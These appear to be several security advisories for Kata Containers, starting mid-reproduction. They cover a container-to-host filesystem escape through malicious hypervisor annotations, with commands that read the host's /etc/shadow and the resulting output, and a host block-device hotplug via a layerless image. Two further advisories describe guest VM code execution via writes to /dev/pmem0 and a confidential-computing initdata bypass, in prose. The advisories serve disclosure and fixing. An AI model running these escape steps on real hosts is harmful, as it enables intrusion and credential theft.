a. Extract a container rootfs and create the rootfs bridge (replace $SB_ID with your container name):

```
SB_ID="poc-exploit"
mkdir -p /$SB_ID/rootfs

# Extract alpine rootfs from OCI image
mkdir -p /tmp/oci-extract
ctr image export /tmp/oci.tar docker.io/library/alpine:latest
tar xf /tmp/oci.tar -C /tmp/oci-extract
IDX=$(jq -r '.manifests[0].digest' /tmp/oci-extract/index.json | sed 's/sha256://')
MFT=$(jq -r '.manifests[] | select(.platform.architecture=="amd64") | .digest' \
    "/tmp/oci-extract/blobs/sha256/$IDX" | head -1 | sed 's/sha256://')
LYR=$(jq -r '.layers[0].digest' "/tmp/oci-extract/blobs/sha256/$MFT" | sed 's/sha256://')
tar xzf "/tmp/oci-extract/blobs/sha256/$LYR" -C /$SB_ID/rootfs

rm -rf /tmp/oci-extract /tmp/oci.tar
```

b. Create a marker file on the host to prove access:

```
echo "HOST_ESCAPE_PROOF_$(date)" > /root/.poc-marker
```

c. Start the container with the malicious annotations:

```
ctr run \
  --runtime io.containerd.kata.v2 \
  --annotation 'io.katacontainers.config.hypervisor.virtio_fs_extra_args=["--sandbox=none","--seccomp=none","-o","source=/","--no-announce-submounts"]' \
  --annotation 'io.katacontainers.config.hypervisor.kernel_params=agent.debug_console agent.debug_console_vport=1026' \
  docker.io/library/alpine:latest $SB_ID \
  sleep 3600 &
```

Wait 20-30 seconds for the VM to start. Verify with `ctr task ls`.

d. Enter the VM through the debug console:

```
/opt/kata/bin/kata-runtime exec $SB_ID
```

e. Inside the VM, mount the host filesystem and read host files:

```
mkdir -p /tmp/hostfs
mount -t virtiofs kataShared /tmp/hostfs
cat /tmp/hostfs/etc/hostname
cat /tmp/hostfs/root/.poc-marker
head -3 /tmp/hostfs/etc/shadow
cat /tmp/hostfs/etc/os-release
ls /tmp/hostfs/opt/kata/bin/
```

f. Observe that /etc/hostname returns the host's hostname (not "localhost"), /etc/os-release shows the host OS (Ubuntu, not Alpine), /etc/shadow shows the host's password hashes, and /opt/kata/bin/ lists the Kata binaries installed on the host.

4. Clean up:

```
ctr task kill $SB_ID --signal SIGKILL
ctr container rm $SB_ID
umount /$SB_ID/rootfs
rm -rf /$SB_ID
```

## Proof of concept output

Below is the output from a successful run on Kata Containers 3.28.0. The host runs Ubuntu 24.04. The container image is Alpine Linux.

```
root@7a7325d5d804:/# mkdir -p /tmp/h && mount -t virtiofs kataShared /tmp/h
root@7a7325d5d804:/# echo DIRCOUNT:$(ls /tmp/h/ | wc -l)
DIRCOUNT:37
root@7a7325d5d804:/# echo HOSTNAME:$(cat /tmp/h/etc/hostname)
HOSTNAME:kata-poc
root@7a7325d5d804:/# echo OSREL:$(head -1 /tmp/h/etc/os-release)
OSREL:PRETTY_NAME="Ubuntu 24.04.3 LTS"
root@7a7325d5d804:/# cat /tmp/h/root/.kata-poc-marker
HOST_NS2_1776058192
root@7a7325d5d804:/# echo SHADOW:$(head -1 /tmp/h/etc/shadow)
SHADOW:root:*:17478:0:99999:7:::
root@7a7325d5d804:/# echo BOOT:$(ls /tmp/h/boot 2>/dev/null | head -3)
BOOT:System.map-6.8.0-100-generic System.map-6.8.0-107-generic config-6.8.0-100-generic
root@7a7325d5d804:/# echo KATA:$(ls /tmp/h/opt/kata/bin 2>/dev/null | head -3)
KATA:cloud-hypervisor containerd-shim-kata-v2 firecracker
```

The host's real hostname (kata-poc), OS (Ubuntu 24.04.3 LTS), /etc/shadow content, kernel files in /boot, and Kata binaries in /opt/kata/bin are all visible from inside the VM. The container itself runs Alpine, confirming this is the host filesystem and not the container's own filesystem.

summary: Runtime: Host block device can be hotplugged to the VM if the container image is malformed or contains no layers
description:
### Summary
When a container image is malformed or contains no layers, containerd falls back to bind-mounting an empty snapshotter directory for the container rootfs. When the Kata runtime attempts to mount the container rootfs, the bind mount causes the rootfs to be detected as a block device, leading to the underlying device being hotplugged to the guest. This can cause filesystem-level errors on the host due to double inode allocation, and may lead to the host's block device being mounted as read-only.

### Details
When a container image has no layers or fails to extract any layers, such that the following code path is reached:
https://github.com/containerd/containerd/blob/d939b6af5f8536c2cae85e919e7c40070557df0e/plugins/snapshots/overlay/overlay.go#L564-L581
Containerd falls back to bind mounting an empty snapshotter directory as the container rootfs.

During the container creation step, the runtime will always attempt to hotplug the rootfs:
https://github.com/kata-containers/kata-containers/blob/a164693e1afead84cd01d5bc3575e2cbfe64ce35/src/runtime/virtcontainers/container.go#L1122-L1126

In the default case, when the rootfs is an overlay mount, the call to  `checkStorageDriver` will return false. However, in the bind-mount case, this check returns true:
https://github.com/kata-containers/kata-containers/blob/c7d0c270ee7dfaa6d978e6e07b99dabdaf2b9fda/src/runtime/virtcontainers/container.go#L1616-L1623

This allows the runtime to process the underlying device as a block device, which causes the host device to be hot-plugged to the Kata VM.

In general, an already-mounted block device should not be hotplugged to a VM, as most filesystems do not support distributed writes from multiple hosts.

## PoC

### Install k3s:
```
curl -sfL https://get.k3s.io | sh -
```

### Install kata:
```
wget https://github.com/kata-containers/kata-containers/releases/download/3.24.0/kata-static-3.24.0-amd64.tar.zst -O /tmp/kata.tar.zst
tar -xf /tmp/kata.tar.zst -C /
```

### Setup the runtime class:
```
cp /var/lib/rancher/k3s/agent/etc/containerd/config.toml /var/lib/rancher/k3s/agent/etc/containerd/config.toml.tmpl
cat >> /var/lib/rancher/k3s/agent/etc/containerd/config.toml.tmpl << EOF
[plugins."io.containerd.cri.v1.runtime".containerd.runtimes.kata-clh]
  runtime_type = "io.containerd.kata.v2"
  runtime_path = "/opt/kata/bin/containerd-shim-kata-v2"
  pod_annotations = ["io.katacontainers.*"]
  privileged_without_host_devices = true
  snapshotter = "overlayfs"
  [plugins."io.containerd.cri.v1.runtime".containerd.runtimes.kata-clh.options]
    ConfigPath = "/opt/kata/share/defaults/kata-containers/configuration-clh.toml"

[debug]
  level = "debug"
EOF

systemctl restart k3s

kubectl apply -f - << EOF
apiVersion: node.k8s.io/v1
handler: kata-clh
kind: RuntimeClass
metadata:
  name: kata-clh
EOF
```

### Setup logs
```
sed -i 's|^#\?enable_debug.*|enable_debug = true|' /opt/kata/share/defaults/kata-containers/configuration-clh.toml
```

### Run the pod
Docker image:
```
FROM scratch
```
```
kubectl apply -f - << EOF
apiVersion: v1
kind: Pod
metadata:
  name: no-layer-image
spec:
  containers:
  - name: no-layer-image
    image: champgoblem/bad-container-image:latest
    resources: {}
    command:
    - sleep
    - infinity
  runtimeClassName: kata-clh
EOF
```

### Observe the result

Once the pod has attempted to start `dmesg` on the host will likely show a "doubly allocated" error for the disk that backs the storage for containerd, for example:
```
[ 1148.894226] EXT4-fs error (device nvme0n1p1): __ext4_new_inode:1276: comm containerd: failed to insert inode 1310846: doubly allocated?
```

Filtering for Kata logs `journalctl -t kata | grep "Block device detected"` will show the matching device:
```
Dec 15 11:31:50 kata-patch kata[5389]: time="2025-12-15T11:31:50.577908088Z" level=info msg="Block device detected" container=cc6c49e07ebd709d9ee3ac6274736edf7b083dbd43468b27aeade36bca085e55 device-path=/dev/root fs-type=ext4 name=containerd-shim-v2 pid=5389 sandbox=34a2a66ecd6e563d34d6106fb70184e36ca79e626bf3cdc3d81e970643118945 source=virtcontainers subsystem=container
```

### Impact
This will impact any user using the default overalyfs containerd snapshotter, who can spawn a container in the Kata runtime class with an image that has no layers. Passing through the host device to the Kata VM when in use by the host system will lead to filesystem errors on the host, and in most cases will cause the host disk to be remounted as read-only, impacting other services and workloads running on the same host. In the worst case, this can cause a complete host failure due to the boot disk being remounted as read-only.

### Fix
Fixed by 20ca4d2d79aa5bf63aa1254f08915da84f19e92a.

summary: Kata Container to Guest micro VM privilege escalation
description:
### Summary

An issue in Kata with Cloud Hypervisor allows a user of the container to modify the file system used by the Guest micro VM ultimately achieving arbitrary code execution as root in said VM. In my current understanding, this doesn’t impact the security of the Host or of other containers / VMs running on that Host (note that arm64 QEMU lacks NVDIMM read-only support: I think - unverified - that until the upstream QEMU gains this capability, a guest write could reach the image file).

### Details

_Linux virtio-pmem_
The `virtio-pmem` probe path always registers the region as a generic pagemap that supports asynchronous flushes, but it never marks the region as read-only.  Only the `ND_REGION_PAGEMAP` and `ND_REGION_ASYNC` bits are set before the region is created, so `nd_region->ro always` stays cleared and the block device is left writable.

Later, `pmem_attach_disk()` wires the region into the block layer with full read/write semantics – the block device operations call `pmem_do_write()` which performs cache-flushed memcpy operations directly into the host-provided shared memory window. `nvdimm_check_and_set_ro()` would set the disk read-only if the region had been flagged as such, but because `virtio_pmem` never sets that flag, the helper becomes a no-op.

_Cloud-Hypervisor virtio_pmem_
`discard_writes=on` causes the file backing the `virtio-pmem` device to be opened read-only and mapped with `MAP_PRIVATE` rather than `MAP_SHARED`. That combination means the guest can modify the private copy of the mapped pages, but those modifications never propagate back to the underlying file. The guest (and Cloud Hypervisor process) will still read the modified data because it lives in the private copy of the mapping, so write-then-read sequences appear to succeed even though nothing is persisted. Once the mapping is dropped or the VM is restarted, those copy-on-write changes disappear, leaving the backing file unchanged.

_Kata /dev/pmem0_
Kata boots each pod/VM by DAX-mapping a read-only guest image from the host into the VM and telling the guest kernel to mount the resulting `/dev/pmem*` device as its root filesystem.
Since DAX maps the backing file directly into guest memory, there is no way for the hypervisor to intercept or reject individual stores, so a container with sufficient permissions can open `/dev/pmem0` and observe its own writes until the VM is rebooted or the cache is dropped.

### PoC

When putting all this together, this means that a user of a Container (not necessarily privileged, we don’t need `CAP_SYS_ADMIN`, but we need `CAP_MKNOD`) can modify the Guest OS filesystem, replacing libraries or binaries to achieve arbitrary code execution outside of the Container. This requires computing offsets of files within the device, which requires information like the partition start sector, sector size in bytes, the filesystem block size, and the physical block index of the file.

To achieve execution on the Guest, I replaced `/usr/bin/systemd-tmpfiles` with a connect-back shell to `localhost`: timers end up executing 15min after boot.
I use `debugfs` to not require mounting privileges and work directly with the filesystem on `/dev/pmem0p1` to get the absolute offset of the file to modify in the device.

If you want a simpler PoC, just `dd` write something into `/dev/pmem0` and observe it's `dd` readable until discarded.

summary: coco-tdx: malicious host can circumvent initdata verification
description:
### Summary

On TDX systems running confidential guests, a malicious host can selectively fail IO operations to skip initdata verification. This allows an attacker to launch arbitrary workloads while being able to attest successfully to Trustee impersonating any benign workload.

### Details

The canonical way to ensure VM integrity for TEEs is to supply initdata to the VM with an agent policy that restricts what actions the runtime may perform on the agent. Before applying the agent policy, the Kata agent starts the attestation agent and waits until it _bound_[^1] the policy. Only after initdata is bound, the agent proceeds to accept requests from the host.

The attestation agent will only be started if it is part of the rootfs, but the policy will be set unconditionally:

https://github.com/kata-containers/kata-containers/blob/c980b6e191e174053681fb30817736e040554c10/src/agent/src/main.rs#L410-L431

Whether the AA is part of the rootfs is determined with the following check:

https://github.com/kata-containers/kata-containers/blob/c980b6e191e174053681fb30817736e040554c10/src/agent/src/main.rs#L460-L474

This function contains a bug: `Path::exists` can return `false` even if the path actually exists - for example, on IO errors (https://doc.rust-lang.org/src/std/path.rs.html#3135-3136). 

There are two ways for the host to force an IO error:

1. If the host tampers with the part of the rootfs containing the AA binary, this will be detected by the veritysetup and cause an `EIO` return.
2. If the host just fails the `read` call for the respective sectors, this will likely also manifest in an `EIO`.

Since neither `panic_on_corruption` or `panic_on_error` are set, the VM should proceed to run, skipping initdata validation.

https://github.com/kata-containers/kata-containers/blob/c980b6e191e174053681fb30817736e040554c10/tools/packaging/static-build/initramfs/init.sh#L51

[^1]:  Binding means comparing the initdata hash to HOSTDATA/MRCONFIGID or extending a TPM PCR with the hash. This binding ensures that initdata is reflected in attestation statements generated by the AA, _or by anything else running in the VM_.

#### Suggested fix

* The agent should use `Path::try_exists` and bail on errors that are not `ENOENT`.
* The rootfs should be mounted with `panic_on_corruption` and `panic_on_error` to prevent similar issues in the future.

### PoC

I did not attempt to execute this attack, as it's rather involved and the fix is straightforward.

### Impact

The vuln applies only to CoCo variants using rootfs and dm-verity: if the guest component binaries are in the initrd, the host can't intercept the IO (which happens in encrypted guest memory). This is the case for bare metal TDX, and possibly for CAA on all TEEs (did not check).

Vulnerable systems allow an attacker (with host privileges) to configure a policy of their choosing (e.g. `allow-all.rego`), while being able to generate attestation statements for initdata hashes of their choice (through MRCONFIGID or TPM PCR).
